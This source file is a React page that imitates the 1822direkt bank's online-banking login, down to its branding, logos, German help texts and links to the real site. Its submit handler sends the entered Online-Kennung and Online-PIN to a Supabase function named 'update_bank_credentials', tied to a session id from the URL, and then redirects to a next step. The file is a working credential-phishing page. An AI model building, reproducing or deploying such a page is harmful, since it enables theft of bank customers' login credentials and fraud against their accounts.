import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Info } from "lucide-react";
import logoAsset from "@/assets/1822direkt-logo.svg.asset.json";
import faviconAsset from "@/assets/favicons/1822direkt.webp.asset.json";
import logoSquareAsset from "@/assets/1822direkt-logo-square.svg.asset.json";
import heroAsset from "@/assets/1822direkt-30jahre.jpg.asset.json";

const NAVY = "#00386a";
const RED = "#ee0000";
const PAGE_BG = "#f2f5f8";
const BACKDROP = "#e6ebf0";
const BORDER = "#ccd7e1";
const CARD = "#ffffff";
const TEXT = "#303030";
const MUTED = "#0000008a";
const INPUT_BG = "#eaf0f6";
const FONT = "'Figtree', 'Helvetica Neue', Arial, sans-serif";

const URLS = {
  home: "https://www.1822direkt.de/",
  help: "https://www.1822direkt.de/service/kontakt/",
  forgotId: "https://www.1822direkt.de/service/online-banking/online-kennung-vergessen/",
  newBanking: "https://www.1822direkt.de/service/online-banking/",
  forgotPin: "https://www.1822direkt.de/service/online-banking/online-pin-vergessen/",
  warnings: "https://www.1822direkt.de/service/sicherheit/",
  offer: "https://www.1822direkt.de/aktionen/30-jahre/",
  openProduct: "https://www.1822direkt.de/produkte/",
  contact: "https://www.1822direkt.de/service/kontakt/",
  accessibility: "https://www.1822direkt.de/service/barrierefreiheit/",
  privacy: "https://www.1822direkt.de/datenschutz/",
  imprint: "https://www.1822direkt.de/impressum/",
  terms: "https://www.1822direkt.de/service/agb-preise/",
};

const Direkt1822 = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [kennung, setKennung] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [focusField, setFocusField] = useState<null | "k" | "p">(null);

  const INPUT_BORDER = "#00386a";
  const FOCUS_RING = "0 0 0 2px #fff, 0 0 0 4px #176bc0";

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("1822direkt Online-Banking", faviconAsset.url);

  const canSubmit = kennung.trim().length > 0 && pin.length > 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit || submitting) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: kennung,
        p_password: pin,
        p_username_label: "Online-Kennung",
        p_password_label: "Online-PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const InfoDot = ({ text }: { text: string }) => {
    const [open, setOpen] = useState(false);
    return (
      <span style={{ position: "relative", display: "inline-flex", alignItems: "center", marginLeft: 6, verticalAlign: "middle", lineHeight: 0 }}>
        <span
          tabIndex={0}
          onMouseEnter={() => setOpen(true)}
          onMouseLeave={() => setOpen(false)}
          onFocus={() => setOpen(true)}
          onBlur={() => setOpen(false)}
          onClick={() => setOpen((v) => !v)}
          style={{
            display: "inline-flex", alignItems: "center", justifyContent: "center",
            width: 16, height: 16, borderRadius: "50%", background: NAVY, color: "#fff",
            cursor: "pointer", fontFamily: "Georgia, serif", fontSize: 10, fontWeight: 700, lineHeight: 1,
          }}
        >
          i
        </span>
        {open && (
          <span
            role="tooltip"
            style={{
              position: "absolute", top: "calc(100% + 10px)", left: "50%", transform: "translateX(-50%)",
              width: 280, background: NAVY, color: "#fff", fontWeight: 700, fontSize: 13, lineHeight: 1.45,
              padding: "12px 14px", zIndex: 50, boxShadow: "0 6px 18px rgba(0,0,0,.15)",
              whiteSpace: "normal", textAlign: "left",
            }}
          >
            <span
              aria-hidden="true"
              style={{
                position: "absolute", top: -7, left: "50%", transform: "translateX(-50%)",
                width: 0, height: 0,
                borderLeft: "7px solid transparent", borderRight: "7px solid transparent",
                borderBottom: `7px solid ${NAVY}`,
              }}
            />
            {text}
          </span>
        )}
      </span>
    );
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ background: BACKDROP, color: TEXT, fontFamily: FONT }}>
      <style>{`
        .d1822-link { transition: background-color .12s; }
        .d1822-link:hover { background-color: #51e5a7; text-decoration: none !important; }
        .d1822-btn { transition: background-color .12s, color .12s, border-color .12s; border: 2px solid #00386a; }
        .d1822-btn:hover:not(:disabled) { background-color: #51e5a7 !important; color: #00386a !important; border-color: #00386a !important; }
      `}</style>

      <div style={{ maxWidth: 1680, margin: "0 auto", width: "100%", background: PAGE_BG, boxShadow: "0 0 20px rgba(0,56,106,.05)" }} className="flex-1 flex flex-col">
        {/* Header */}
        <header style={{ background: "#fff", borderBottom: `1px solid ${BORDER}` }}>
          <div className="flex items-center justify-between px-3 py-3 lg:px-10 lg:py-[18px]">
            <a href={URLS.home} target="_blank" rel="noopener noreferrer" aria-label="1822direkt">
              <img src={logoAsset.url} alt="1822direkt" className="hidden lg:block" style={{ height: 56, width: "auto" }} />
              <img src={logoSquareAsset.url} alt="1822direkt" className="lg:hidden block" style={{ height: 44, width: 44 }} />
            </a>
            <a href={URLS.home} target="_blank" rel="noopener noreferrer" className="d1822-link hidden lg:inline-block"
              style={{ color: NAVY, fontWeight: 600, fontSize: 15, textDecoration: "underline", textUnderlineOffset: 3, padding: "4px 8px" }}>
              Zur Startseite
            </a>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1" style={{ background: PAGE_BG }}>
          <div className="relative mx-auto px-3 pt-6 pb-10 lg:px-10 lg:pt-12 lg:pb-[72px]" style={{ maxWidth: 1200 }}>
            <div className="flex items-center justify-between gap-3 lg:block">
              <h1 className="text-[24px] lg:text-[36px]" style={{ color: NAVY, fontWeight: 200, letterSpacing: "-0.01em" }}>
                Online-Banking<span style={{ color: RED }}>.</span>
              </h1>

              {/* isa bubble - mobile inline */}
              <div aria-hidden="true" className="lg:hidden inline-flex items-center justify-center" style={{
                width: 36, height: 36, borderRadius: "50%",
                background: "#51e5a7",
                color: NAVY, fontWeight: 700, fontSize: 11, flexShrink: 0,
              }}>
                <span style={{ display: "inline-flex", flexDirection: "column", alignItems: "center", lineHeight: 1 }}>
                  <span>isa</span>
                  <span style={{ fontSize: 7, marginTop: 2 }}>⌣</span>
                </span>
              </div>
            </div>

            {/* isa bubble - desktop absolute */}
            <div aria-hidden="true" className="hidden lg:flex" style={{
              position: "absolute", right: 56, top: 120, width: 56, height: 56, borderRadius: "50%",
              background: "#51e5a7", alignItems: "center", justifyContent: "center",
              color: NAVY, fontWeight: 700, fontSize: 16, boxShadow: "0 4px 10px rgba(0,0,0,.08)",
            }}>
              <span style={{ display: "inline-flex", flexDirection: "column", alignItems: "center", lineHeight: 1 }}>
                <span>isa</span>
                <span style={{ fontSize: 10, marginTop: 2 }}>⌣</span>
              </span>
            </div>


            <div className="mt-5 lg:mt-12 gap-2 lg:gap-5" style={{ display: "flex", alignItems: "center", marginBottom: 20 }}>
              <h2 style={{ color: NAVY, fontSize: 20, fontWeight: 700 }}>Anmeldung</h2>
              <a href={URLS.help} target="_blank" rel="noopener noreferrer" className="d1822-link text-[12px] lg:text-[15px] px-0 lg:px-2"
                  style={{ color: NAVY, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3, paddingTop: 4, paddingBottom: 4 }}>
                Benötigen Sie Hilfe?
              </a>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2" style={{ gap: 40, alignItems: "start" }}>
              {/* Login card */}
              <section className="p-5 lg:p-10 lg:pt-8" style={{ background: CARD, boxShadow: "0 6px 18px rgba(0,56,106,.12)" }}>
                <form onSubmit={handleSubmit} noValidate autoComplete="off">
                  <label htmlFor="k" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginBottom: 10 }}>
                    Online-Kennung<InfoDot text="Ihre Online-Kennung (bestehend aus Ihrer Kundennummer und Ihrer Personenkennung) haben wir Ihnen per SMS oder postalisch mitgeteilt. Sie können sie im Online-Banking selbst ändern." />
                  </label>
                  <input id="k" type="text" value={kennung} onChange={(e) => setKennung(e.target.value)}
                    autoComplete="off"
                    onFocus={() => setFocusField("k")} onBlur={() => setFocusField(null)}
                    style={{ width: "100%", background: INPUT_BG, border: `2px solid ${INPUT_BORDER}`, borderRadius: 2, padding: "13px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT, boxShadow: focusField === "k" ? FOCUS_RING : "none" }} />
                  <div className="gap-0" style={{ marginTop: 12, display: "flex", flexWrap: "nowrap" }}>
                    <a href={URLS.forgotId} target="_blank" rel="noopener noreferrer" className="d1822-link text-[12px] lg:text-[14px] whitespace-nowrap pl-0 pr-2 lg:pl-0 lg:pr-[3px]" style={{ color: NAVY, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3, paddingTop: 4, paddingBottom: 4 }}>Online-Kennung vergessen?</a>
                    <a href={URLS.newBanking} target="_blank" rel="noopener noreferrer" className="d1822-link text-[12px] lg:text-[14px] whitespace-nowrap px-2 lg:px-[3px]" style={{ color: NAVY, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3, paddingTop: 4, paddingBottom: 4 }}>Neu im Online-Banking?</a>
                  </div>

                  <label htmlFor="p" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginTop: 28, marginBottom: 10 }}>
                    Online-PIN<InfoDot text="Ihre Online-PIN hat mindestens 8 max 56. Stellen und besteht aus Zahlen und/oder Buchstaben. Dabei wird zwischen Groß- und Kleinbuchstaben unterschieden." />
                  </label>
                  <div style={{ position: "relative", display: "flex", alignItems: "stretch", background: INPUT_BG, border: `2px solid ${INPUT_BORDER}`, borderRadius: 2, boxShadow: focusField === "p" ? FOCUS_RING : "none" }}>
                    <input id="p" type={showPin ? "text" : "password"} value={pin} onChange={(e) => setPin(e.target.value)}
                      autoComplete="off"
                      onFocus={() => setFocusField("p")} onBlur={() => setFocusField(null)}
                      style={{ flex: 1, background: "transparent", border: "none", padding: "13px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT, minWidth: 0 }} />
                    <button type="button" aria-label={showPin ? "PIN verbergen" : "PIN anzeigen"} onClick={() => setShowPin((v) => !v)}
                      style={{ padding: "0 12px", color: NAVY, position: "relative", display: "flex", alignItems: "center" }}>
                      <span aria-hidden="true" style={{ position: "absolute", left: 0, top: "50%", transform: "translateY(-50%)", width: 1, height: 28, background: "#fff" }} />
                      {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>

                  <div style={{ marginTop: 12 }}>
                    <a href={URLS.forgotPin} target="_blank" rel="noopener noreferrer" className="d1822-link text-[12px] lg:text-[14px] pl-0 lg:pl-2" style={{ color: NAVY, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3, paddingTop: 4, paddingBottom: 4, paddingRight: 8 }}>Online-PIN vergessen?</a>
                  </div>

                  <div style={{ marginTop: 32 }}>
                    <button type="submit" disabled={!canSubmit || submitting} className={`${canSubmit ? "d1822-btn" : ""} w-full lg:w-auto`}
                      style={{
                        background: canSubmit ? NAVY : "#757575",
                        color: "#fff", padding: "14px 36px", fontSize: 15, fontWeight: 600,
                        borderRadius: 2, cursor: canSubmit ? "pointer" : "not-allowed",
                        border: canSubmit ? "2px solid #00386a" : "2px solid #757575",
                      }}>
                      Anmelden
                    </button>
                  </div>
                </form>
              </section>

              {/* Promo card */}
              <section className="hidden lg:flex" style={{ background: CARD, padding: 24, boxShadow: "0 6px 18px rgba(0,56,106,.12)", flexDirection: "column" }}>
                <img src={heroAsset.url} alt="30 Jahre 1822direkt" style={{ width: "100%", height: "auto", display: "block" }} />
                <h3 style={{ marginTop: 24, lineHeight: 1 }}>
                  <svg viewBox="0 0 360 24" width="100%" style={{ display: "block", overflow: "visible" }} aria-label="Wir feiern 30 Jahre. Du feierst mit.">
                    <text x="0" y="20" textLength="360" lengthAdjust="spacingAndGlyphs" fill={NAVY} fontWeight={100} fontSize={24} fontFamily="inherit">Wir feiern 30 Jahre. Du feierst mit.</text>
                  </svg>
                </h3>
                <ul style={{ marginTop: 16, display: "flex", flexDirection: "column", gap: 10 }}>
                  {["Jetzt bis zu 300 € sichern", "Entdecke unsere Jubiläumsangebote", "Girokonto, Depot, Tagesgeld sowie Kunden werben"].map((t) => (
                    <li key={t} style={{ display: "flex", alignItems: "center", gap: 12, color: NAVY, fontSize: 15, fontWeight: 700 }}>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke={NAVY} strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                      <span>{t}</span>
                    </li>
                  ))}
                </ul>
                <a href={URLS.offer} target="_blank" rel="noopener noreferrer" className="d1822-btn"
                  style={{ marginTop: "auto", background: NAVY, color: "#fff", textAlign: "center", padding: "16px 24px", fontSize: 15, fontWeight: 700, borderRadius: 2, display: "block", marginBlockStart: 24 }}>
                  Jetzt zum Angebot
                </a>
              </section>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer style={{ background: "#ccd7e1", borderTop: `1px solid ${BORDER}` }}>
          <div className="mx-auto px-3 py-6 lg:px-10 lg:py-7 flex flex-col lg:flex-row lg:justify-between lg:flex-wrap gap-2 lg:gap-4" style={{ maxWidth: 1200 }}>
            <a href={URLS.openProduct} target="_blank" rel="noopener noreferrer" className="d1822-link self-start text-[17px] lg:text-[15px] mb-3 lg:mb-0"
              style={{ color: "#00386a", fontWeight: 700, padding: "4px 8px" }}>
              Neues Produkt eröffnen<span style={{ color: RED }}>.</span>
            </a>
            <div className="flex flex-col lg:flex-row gap-1 lg:gap-9 lg:flex-wrap">
              {[
                { l: "Kontakt", h: URLS.contact },
                { l: "Barrierefreiheit", h: URLS.accessibility },
                { l: "Datenschutz", h: URLS.privacy },
                { l: "Impressum", h: URLS.imprint },
                { l: "AGB & Preise", h: URLS.terms },
              ].map((x) => (
                <a key={x.l} href={x.h} target="_blank" rel="noopener noreferrer" className="d1822-link self-start"
                   style={{ color: "#00386a", fontSize: 13, fontWeight: 700, padding: "4px 8px" }}>{x.l}</a>

              ))}
            </div>
          </div>
        </footer>
      </div>

      {showLoading && <LoadingOverlay onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)} />}
    </div>
  );
};

export default Direkt1822;
